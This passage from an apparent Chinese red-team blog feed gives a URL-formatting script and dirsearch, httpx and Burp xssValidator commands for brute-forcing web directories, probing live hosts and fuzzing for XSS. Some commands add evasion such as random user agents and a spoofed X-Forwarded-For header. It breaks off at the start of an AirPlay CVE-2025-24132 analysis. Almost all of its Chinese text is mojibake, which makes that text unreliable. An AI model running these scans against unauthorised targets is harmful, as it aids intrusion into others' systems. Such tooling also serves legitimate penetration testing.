è§£æURLç»“æ„ï¼Œç»Ÿä¸€åè®®ä¸ºå°å†™</span></span><br><span class="line">    parsed = urlparse(raw_url)</span><br><span class="line">    scheme = parsed.scheme.lower()</span><br><span class="line">    netloc = parsed.netloc  <span class="comment"># ä¸»æœº+ç«¯å£ï¼ˆå¦‚â€œtarget.com:8080â€ï¼‰</span></span><br><span class="line">    path = parsed.path      <span class="comment"># è·¯å¾„ï¼ˆå¦‚â€œ/adminâ€ï¼‰</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. ä¿®æ­£åè®®ä¸ç«¯å£çš„åŒ¹é…å…³ç³»ï¼ˆå¦‚httpsç”¨80ç«¯å£â†’æ”¹ä¸º443ï¼‰</span></span><br><span class="line">    default_ports = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;80&quot;</span>, <span class="string">&quot;https&quot;</span>: <span class="string">&quot;443&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> netloc:</span><br><span class="line">        host, port = netloc.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># ç«¯å£éæ•°å­—æ—¶ï¼Œé‡ç½®ä¸ºé»˜è®¤ç«¯å£</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> port.isdigit() <span class="keyword">or</span> <span class="keyword">not</span> (<span class="number">1</span> &lt;= <span class="built_in">int</span>(port) &lt;= <span class="number">65535</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âš ï¸  æ— æ•ˆç«¯å£ï¼š<span class="subst">&#123;port&#125;</span>ï¼Œå·²é‡ç½®ä¸º<span class="subst">&#123;scheme&#125;</span>é»˜è®¤ç«¯å£<span class="subst">&#123;default_ports[scheme]&#125;</span>&quot;</span>)</span><br><span class="line">            netloc = <span class="string">f&quot;<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;default_ports[scheme]&#125;</span>&quot;</span></span><br><span class="line">        <span class="comment"># åè®®ä¸ç«¯å£ä¸åŒ¹é…æ—¶ï¼Œä¿®æ­£ç«¯å£</span></span><br><span class="line">        <span class="keyword">elif</span> port != default_ports[scheme]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âš ï¸  åè®®ä¸ç«¯å£ä¸åŒ¹é…ï¼š<span class="subst">&#123;scheme&#125;</span>ä½¿ç”¨<span class="subst">&#123;port&#125;</span>ç«¯å£ï¼Œå·²ä¿®æ­£ä¸ºé»˜è®¤<span class="subst">&#123;default_ports[scheme]&#125;</span>ç«¯å£&quot;</span>)</span><br><span class="line">            netloc = <span class="string">f&quot;<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;default_ports[scheme]&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># æ— ç«¯å£æ—¶ï¼Œè¡¥å……åè®®é»˜è®¤ç«¯å£ï¼ˆæ˜¾å¼æŒ‡å®šæ›´è§„èŒƒï¼Œé¿å…dirsearchè§£ææ­§ä¹‰ï¼‰</span></span><br><span class="line">        netloc = <span class="string">f&quot;<span class="subst">&#123;netloc&#125;</span>:<span class="subst">&#123;default_ports[scheme]&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. æ¸…ç†å†—ä½™è·¯å¾„ï¼ˆä»…ä¿ç•™æ ¹è·¯å¾„â€œ/â€ï¼Œé¿å…ç¼©å°dirsearchæ‰«æèŒƒå›´ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> path <span class="keyword">and</span> path != <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;âš ï¸  å†—ä½™è·¯å¾„æ¸…ç†ï¼š<span class="subst">&#123;raw_url&#125;</span> çš„è·¯å¾„<span class="subst">&#123;path&#125;</span>å·²ç§»é™¤ï¼Œdirsearchå°†è‡ªåŠ¨çˆ†ç ´æ‰€æœ‰è·¯å¾„&quot;</span>)</span><br><span class="line">        path = <span class="string">&quot;/&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 5. é‡ç»„URLï¼ˆæ¸…é™¤æŸ¥è¯¢å‚æ•°ã€ç‰‡æ®µç­‰æ— å…³å†…å®¹ï¼Œå¦‚â€œhttp://target.com?a=1#topâ€â†’â€œhttp://target.com:80â€ï¼‰</span></span><br><span class="line">    formatted_url = urlunparse((scheme, netloc, path, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="comment"># ç§»é™¤æ ¹è·¯å¾„æ–œæ ï¼ˆå¦‚â€œhttp://target.com:80/â€â†’â€œhttp://target.com:80â€ï¼Œä¸¤è€…ç­‰æ•ˆä½†æ›´ç®€æ´ï¼‰</span></span><br><span class="line">    formatted_url = re.sub(<span class="string">r&quot;:(\d+)/$&quot;</span>, <span class="string">r&quot;:\1&quot;</span>, formatted_url)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> formatted_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_targets</span>(<span class="params">input_source: <span class="built_in">str</span>, is_file: <span class="built_in">bool</span>, output_file: <span class="built_in">str</span> = <span class="string">&quot;formatted_targets.txt&quot;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    æ•´ä½“æµç¨‹ï¼šè¯»å–è¾“å…¥â†’è¿‡æ»¤æ— æ•ˆåœ°å€â†’æ ¼å¼åŒ–åˆæ³•åœ°å€â†’ä¿å­˜ç»“æœ</span></span><br><span class="line"><span class="string">    :param input_source: è¾“å…¥æºï¼ˆæ–‡ä»¶è·¯å¾„æˆ–é€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line"><span class="string">    :param is_file: æ˜¯å¦ä¸ºæ–‡ä»¶è¾“å…¥</span></span><br><span class="line"><span class="string">    :param output_file: æ ¼å¼åŒ–ç»“æœä¿å­˜è·¯å¾„</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. è¯»å–åŸå§‹ç›®æ ‡åˆ—è¡¨ï¼Œè¿‡æ»¤ç©ºè¡Œå’Œæ³¨é‡Š</span></span><br><span class="line">    raw_targets = []</span><br><span class="line">    <span class="keyword">if</span> is_file:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(input_source, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                    line = line.strip()</span><br><span class="line">                    <span class="comment"># è·³è¿‡ç©ºè¡Œå’Œâ€œ#â€å¼€å¤´çš„æ³¨é‡Šè¡Œ</span></span><br><span class="line">                    <span class="keyword">if</span> line <span class="keyword">and</span> <span class="keyword">not</span> line.startswith(<span class="string">&quot;#&quot;</span>):</span><br><span class="line">                        raw_targets.append(line)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âŒ é”™è¯¯ï¼šæ–‡ä»¶<span class="subst">&#123;input_source&#125;</span>ä¸å­˜åœ¨ï¼Œè¯·æ£€æŸ¥è·¯å¾„&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># éæ–‡ä»¶è¾“å…¥ï¼šæŒ‰é€—å·åˆ†å‰²ï¼Œè¿‡æ»¤ç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">        raw_targets = [t.strip() <span class="keyword">for</span> t <span class="keyword">in</span> input_source.split(<span class="string">&quot;,&quot;</span>) <span class="keyword">if</span> t.strip()]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> raw_targets:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;âŒ æœªæ£€æµ‹åˆ°ä»»ä½•æœ‰æ•ˆè¾“å…¥ï¼Œè¯·æ£€æŸ¥ç›®æ ‡å†…å®¹&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. æ‰¹é‡å¤„ç†ï¼šæ ¡éªŒâ†’æ ¼å¼åŒ–</span></span><br><span class="line">    valid_formatted = []</span><br><span class="line">    invalid_list = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;å¼€å§‹å¤„ç†ï¼ˆå…±<span class="subst">&#123;<span class="built_in">len</span>(raw_targets)&#125;</span>ä¸ªåŸå§‹ç›®æ ‡ï¼‰ï¼š&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">    <span class="keyword">for</span> idx, target <span class="keyword">in</span> <span class="built_in">enumerate</span>(raw_targets, <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> is_valid_target(target):</span><br><span class="line">            <span class="comment"># åˆæ³•ç›®æ ‡ï¼šæ ¼å¼åŒ–ååŠ å…¥ç»“æœåˆ—è¡¨</span></span><br><span class="line">            formatted = format_valid_target(target)</span><br><span class="line">            valid_formatted.append(formatted)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âœ… <span class="subst">&#123;idx:2d&#125;</span>. åˆæ³•åœ°å€ï¼š<span class="subst">&#123;target:35s&#125;</span> â†’ æ ¼å¼åŒ–åï¼š<span class="subst">&#123;formatted&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># æ— æ•ˆç›®æ ‡ï¼šè®°å½•åˆ°æ— æ•ˆåˆ—è¡¨ï¼Œä¸å‚ä¸åç»­å¤„ç†</span></span><br><span class="line">            invalid_list.append(target)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;âŒ <span class="subst">&#123;idx:2d&#125;</span>. æ— æ•ˆåœ°å€ï¼š<span class="subst">&#123;target:35s&#125;</span>ï¼ˆéåŸŸå/IPï¼Œå·²è¿‡æ»¤ï¼‰&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. ä¿å­˜æ ¼å¼åŒ–ç»“æœ</span></span><br><span class="line">    <span class="keyword">if</span> valid_formatted:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&quot;\n&quot;</span>.join(valid_formatted))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¤„ç†å®Œæˆï¼ç»Ÿè®¡å¦‚ä¸‹ï¼š&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ“Š åŸå§‹ç›®æ ‡æ€»æ•°ï¼š<span class="subst">&#123;<span class="built_in">len</span>(raw_targets)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;âœ… æœ‰æ•ˆæ ¼å¼åŒ–ç›®æ ‡æ•°ï¼š<span class="subst">&#123;<span class="built_in">len</span>(valid_formatted)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;âŒ æ— æ•ˆåœ°å€æ•°ï¼ˆå·²è¿‡æ»¤ï¼‰ï¼š<span class="subst">&#123;<span class="built_in">len</span>(invalid_list)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ“ ç»“æœä¿å­˜è·¯å¾„ï¼š<span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ğŸ’¡ ä½¿ç”¨æ–¹å¼ï¼špython dirsearch.py -l <span class="subst">&#123;output_file&#125;</span> [å…¶ä»–å‚æ•°]&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;âŒ å¤„ç†å®Œæˆï¼Œä½†æœªæ£€æµ‹åˆ°ä»»ä½•æœ‰æ•ˆç›®æ ‡ï¼ˆæ‰€æœ‰è¾“å…¥å‡ä¸ºéåœ°å€å­—ç¬¦ï¼‰&quot;</span>)</span><br><span class="line">        <span class="comment"># é¿å…ç”Ÿæˆç©ºæ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(output_file):</span><br><span class="line">            os.remove(output_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="comment"># å‘½ä»¤è¡Œå‚æ•°è§£æ</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;dirsearchç›®æ ‡URLå¤„ç†å·¥å…·ï¼šå…ˆæ ¡éªŒåˆæ³•æ€§ï¼Œå†æ ‡å‡†åŒ–æ ¼å¼åŒ–&quot;</span>)</span><br><span class="line">    group = parser.add_mutually_exclusive_group(required=<span class="literal">True</span>)</span><br><span class="line">    group.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;è¾“å…¥ç›®æ ‡æ–‡ä»¶è·¯å¾„ï¼ˆæ¯è¡Œ1ä¸ªç›®æ ‡ï¼Œæ”¯æŒ#æ³¨é‡Šå’Œç©ºè¡Œï¼‰&quot;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--urls&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;ç›´æ¥è¾“å…¥ç›®æ ‡åˆ—è¡¨ï¼ˆç”¨é€—å·åˆ†éš”ï¼Œå¦‚\&quot;target.com,192.168.1.1:8080\&quot;ï¼‰&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, default=<span class="string">&quot;formatted_targets.txt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;ç»“æœä¿å­˜æ–‡ä»¶ï¼ˆé»˜è®¤ï¼šformatted_targets.txtï¼‰&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰§è¡Œå¤„ç†é€»è¾‘</span></span><br><span class="line">    <span class="keyword">if</span> args.file:</span><br><span class="line">        process_targets(input_source=args.file, is_file=<span class="literal">True</span>, output_file=args.output)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        process_targets(input_source=args.urls, is_file=<span class="literal">False</span>, output_file=args.output)</span><br></pre></td></tr></table></figure>

 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python url_formatter.py -f raw_targets.txt -o valid_targets.txt</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="çˆ†ç ´å•ä¸ªç›®æ ‡"><a href="#çˆ†ç ´å•ä¸ªç›®æ ‡" class="headerlink" title="çˆ†ç ´å•ä¸ªç›®æ ‡"></a>çˆ†ç ´å•ä¸ªç›®æ ‡</h3><ol>
<li><p>æœ€ä½³è¯­æ³•</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -e php,html,js,txt -t 15 --delay 0.5 --random-agent --exclude-status 404,403,500-599 --exclude-sizes 0B,1KB-2KB --cookie &quot;PHPSESSID=random_value; X-Requested-With=XMLHttpRequest&quot; -w /usr/share/wordlists/dirb/common.txt --format json -o target_scan_result.json -u http://target.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>æå–è·¯å¾„</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;target_scan_result.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line"><span class="comment"># æå–çŠ¶æ€ç 200çš„æœ‰æ•ˆè·¯å¾„</span></span><br><span class="line">valid_paths = [entry[<span class="string">&quot;path&quot;</span>] <span class="keyword">for</span> entry <span class="keyword">in</span> data[<span class="string">&quot;results&quot;</span>] <span class="keyword">if</span> entry[<span class="string">&quot;status&quot;</span>] == <span class="number">200</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æœ‰æ•ˆè·¯å¾„ï¼š&quot;</span>, valid_paths)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="å¤šç›®æ ‡è·¯å¾„çˆ†ç ´"><a href="#å¤šç›®æ ‡è·¯å¾„çˆ†ç ´" class="headerlink" title="å¤šç›®æ ‡è·¯å¾„çˆ†ç ´"></a>å¤šç›®æ ‡è·¯å¾„çˆ†ç ´</h3><ol>
<li><p>æœ€ä½³å®è·µ</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -e php,html,js,txt,asp -t 10 --delay 1 --random-agent -H &quot;X-Forwarded-For: 8.8.8.8&quot; --exclude-status 404,403,500-599 --exclude-sizes 0B,1KB-3KB --max-time 300 --session multi_target_scan.session -w /usr/share/wordlists/dirb/common.txt --format json -o multi_target_results.json -l /path/to/target_urls.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>è·¯å¾„æå–</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">result_dir = <span class="string">&quot;multi_target_results&quot;</span></span><br><span class="line">valid_paths = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æ‰€æœ‰ç›®æ ‡çš„JSONç»“æœæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(result_dir):</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&quot;.json&quot;</span>):</span><br><span class="line">        target = filename.replace(<span class="string">&quot;.json&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(result_dir, filename), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = json.load(f)</span><br><span class="line">        <span class="comment"># æå–çŠ¶æ€ç 200ã€å“åº”å¤§å°&gt;3KBçš„è·¯å¾„</span></span><br><span class="line">        <span class="keyword">for</span> entry <span class="keyword">in</span> data[<span class="string">&quot;results&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> entry[<span class="string">&quot;status&quot;</span>] == <span class="number">200</span> <span class="keyword">and</span> <span class="built_in">int</span>(entry[<span class="string">&quot;size&quot;</span>].replace(<span class="string">&quot;KB&quot;</span>, <span class="string">&quot;&quot;</span>)) &gt; <span class="number">3</span>:</span><br><span class="line">                valid_paths.append(&#123;<span class="string">&quot;target&quot;</span>: target, <span class="string">&quot;path&quot;</span>: entry[<span class="string">&quot;path&quot;</span>], <span class="string">&quot;size&quot;</span>: entry[<span class="string">&quot;size&quot;</span>]&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºæ•´ç†åçš„æœ‰æ•ˆè·¯å¾„</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> valid_paths:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ç›®æ ‡ï¼š<span class="subst">&#123;item[<span class="string">&#x27;target&#x27;</span>]&#125;</span> | æœ‰æ•ˆè·¯å¾„ï¼š<span class="subst">&#123;item[<span class="string">&#x27;path&#x27;</span>]&#125;</span> | å¤§å°ï¼š<span class="subst">&#123;item[<span class="string">&#x27;size&#x27;</span>]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="httpx"><a href="#httpx" class="headerlink" title="httpx"></a>httpx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">httpxåŠŸèƒ½å¾ˆå¤šï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¹é‡æ¢æµ‹å­˜æ´»çš„ç›®æ ‡å³å¯ï¼ˆæ‰¹é‡è®¿é—®ï¼Œç„¶è·å–StatusCodeã€Titleã€ipç­‰æ ¸å¿ƒå­—æ®µï¼Œäººå·¥åˆ¤æ–­å­˜æ´»å³å¯ï¼‰</span></span><br><span class="line">httpx -sc -cl -title -ip -t 120 -fr -csv -o &quot;httpx-hosts.csv&quot; -l &quot;hosts.txt&quot;</span><br><span class="line"></span><br><span class="line">	-sc: Status Code</span><br><span class="line">	-cl: Content Length</span><br><span class="line">	-title: Page Title</span><br><span class="line">	-ip: A/AAAA/CNAME</span><br><span class="line">	-t: threads</span><br><span class="line">	-fr: follow redirect</span><br><span class="line">	-csv -o: save xxx.csv</span><br><span class="line">	-l: a list of hosts</span><br></pre></td></tr></table></figure>

<h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><h3 id="xssValidator"><a href="#xssValidator" class="headerlink" title="xssValidator"></a>xssValidator</h3><ol>
<li><p>BurpStoreä¸‹è½½xssValidatoræ’ä»¶</p>
</li>
<li><p>Intruderè®¾ç½®payload</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211149773.png" alt="image-20251116211149773"></p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211301073.png" alt="image-20251116211301073"></p>
</li>
<li><p>åœ¨Intruderçš„Settingæ¨¡å—ä¸­ï¼Œæ·»åŠ å¯¹ç»“æœè¿›è¡Œå…³é”®å­—åŒ¹é…ï¼ˆæœ€å¥½å…·æœ‰æ ‡å¿—æ€§ï¼Œä¸è¦å’Œæ­£å¸¸ä»£ç æ··æ·†äº†ï¼‰</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211447510.png" alt="image-20251116211447510"></p>
</li>
<li><p>åœ¨xssValidatoræ’ä»¶ä¸­è®¾ç½®åŒæ ·çš„å…³é”®å­—</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211535215.png" alt="image-20251116211535215"></p>
</li>
<li><p>å¼€å§‹çˆ†ç ´</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251116211758912.png" alt="image-20251116211758912"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>çº¢é˜Ÿ</category>
      </categories>
      <tags>
        <tag>æ­¦å™¨åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2025-24132å¨èƒæƒ…æŠ¥åˆ†æ</title>
    <url>/CVE-2025-24132.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="å¨èƒæƒ…æŠ¥"><a href="#å¨èƒæƒ…æŠ¥" class="headerlink" title="å¨èƒæƒ…æŠ¥"></a>å¨èƒæƒ…æŠ¥</h1><blockquote>
<ol>
<li>ä»¥è‰²åˆ—ç½‘ç»œå®‰å…¨å…¬å¸â€œOligoâ€æŠ«éœ²äº†AirPlayåè®®ä¸­å­˜åœ¨çš„ä¸€ç»„æ¼æ´ï¼Œå‘½åä¸º â€œAirBorneâ€ ã€‚å…¶ä¸­å€¼å¾—å…³æ³¨çš„æœ‰ä¸¤ä¸ªï¼šCVE-2025-24132ã€CVE-2025-24252ã€‚</li>
<li>å‚è€ƒæ–‡ç« <ul>
<li><a href="https://zhuanlan.zhihu.com/p/683643576">æ·±å…¥è§£æRTSPåè®®ï¼šæµåª’ä½“ä¼ è¾“çš„æ§åˆ¶æ ¸å¿ƒ - çŸ¥ä¹</a></li>
<li><a href="https://fingergit.github.io/Unofficial-AirPlay-Protocol-Specification/AirPlay.html">AirPlayåè®®è§„èŒƒï¼ˆéå®˜æ–¹ï¼‰</a></li>
<li><a href="https://wenku.csdn.net/column/159v2uiruj#3.1%20Airplay">https://wenku.csdn.net/column/159v2uiruj#3.1%20Airplay</a></li>
<li><a href="https://blog.csdn.net/weixin_30481539/article/details/151272328">AirPlayåè®®æºç åˆ†æä¸åè®®è¯¦è§£-CSDNåšå®¢</a></li>
</ul>
</li>
</ol>
</blockquote>
<h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><p>Airplayæ˜¯è‹¹æœå…¬å¸æ¨å‡ºçš„ä¸€å¥—åŸºäºä»¥å¤ªç½‘é€šä¿¡çš„è¿œç¨‹éŸ³è§†é¢‘æ’­æ”¾åè®®ï¼Œç”¨æ¥è¿œç¨‹æ’­æ”¾éŸ³é¢‘ã€è§†å±ç­‰ç­‰ï¼ˆæ¯”å¦‚iPhoneä¸Šçš„å±å¹•é•œåƒåŠŸèƒ½ã€ç›´æ’­æŠ•å±ï¼‰åˆ©ç”¨ç°æœ‰çš„TCP&#x2F;IPåè®®æ ˆï¼Œå¢åŠ äº†ä¸€äº›åŠŸèƒ½ï¼ŒåŒ…æ‹¬ä»è®¾å¤‡çš„å‘ç° -&gt; è®¾å¤‡è¿æ¥ -&gt; éŸ³é¢‘&#x2F;è§†é¢‘æµæ•°æ®çš„ä¼ è¾“ã€‚Airplayåè®®åˆ°ç›®å‰ï¼ˆ2025å¹´ï¼‰åŸºæœ¬ä¸Šå†ç»äº†2ä¸ªç‰ˆæœ¬ï¼Œåœ¨ç‰ˆæœ¬ä¸€ä¸­ä¸»è¦é‡‡ç”¨RTSPåè®®ç›¸TCP&#x2F;7000ä¼ è¾“æ§åˆ¶å‘½ä»¤ï¼Œè€Œç‰ˆæœ¬äºŒä¸­ï¼Œä¸»è¦é‡‡ç”¨HTTPåè®®å‘TCP&#x2F;7000ä¼ é€’å‘½ä»¤ï¼›å¹¶ä¸”ï¼Œåœ¨airplay2.xç‰ˆæœ¬ä¸­ï¼ŒåŠ ä¸Šäº†TLSç­‰åŠ å¯†å’Œè®¤è¯çš„æ‰‹æ®µï¼Œå¯¹ä¼ é€’çš„å†…å®¹è¿›è¡Œåˆ°äº†åŠ å¯†å¤„ç†ã€‚Airpalyçš„å®ç°é‡‡ç”¨C&#x2F;Sæ¶æ„ï¼Œä¸‹é¢ä»¥iPhoneä½œä¸ºClientã€æ”¯æŒApple TVä½œä¸ºServerè¿›è¡Œè®²è¿°ã€‚</p>
<table>
<thead>
<tr>
<th>åè®®</th>
<th>ç«¯å£</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>UDPï¼ˆmDNS&#x2F;Bonjourï¼‰</td>
<td>5353</td>
<td>å‘ç°å±€åŸŸç½‘ä¸­çš„Airplayå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯</td>
</tr>
<tr>
<td>TCP</td>
<td>7000</td>
<td>ä¼ è¾“æ§åˆ¶ç›¸å…³çš„å‘½ä»¤ï¼ˆRTSPæˆ–è€…HTTPæ ¼å¼ï¼‰</td>
</tr>
<tr>
<td>TCP</td>
<td>7100</td>
<td>ä¼ è¾“é•œåƒæ•°æ®ï¼ˆæŠ•å±ï¼‰</td>
</tr>
<tr>
<td>UDP</td>
<td>6000&#x2F;6001</td>
<td>ä¼ è¾“RTPéŸ³é¢‘æ•°æ®</td>
</tr>
</tbody></table>
<h3 id="é€šä¿¡è¿‡ç¨‹æè¿°"><a href="#é€šä¿¡è¿‡ç¨‹æè¿°" class="headerlink" title="é€šä¿¡è¿‡ç¨‹æè¿°"></a>é€šä¿¡è¿‡ç¨‹æè¿°</h3><ol>
<li><p>mDNSæŸ¥è¯¢ï¼šiPhoneåˆ©ç”¨mDNS(åˆå«åšBonjour)åè®®ï¼Œå‘ç°å‘¨å›´æ”¯æŒairplayåè®®çš„è®¾å¤‡</p>
<ul>
<li><p>iPhoneé€šè¿‡udp5353ç«¯å£ï¼Œå‘å¤šæ’­åœ°å€224.0.0.251å‘èµ·å¹¿æ’­ï¼Œå¯»æ‰¾å¯ç”¨çš„airplay server</p>
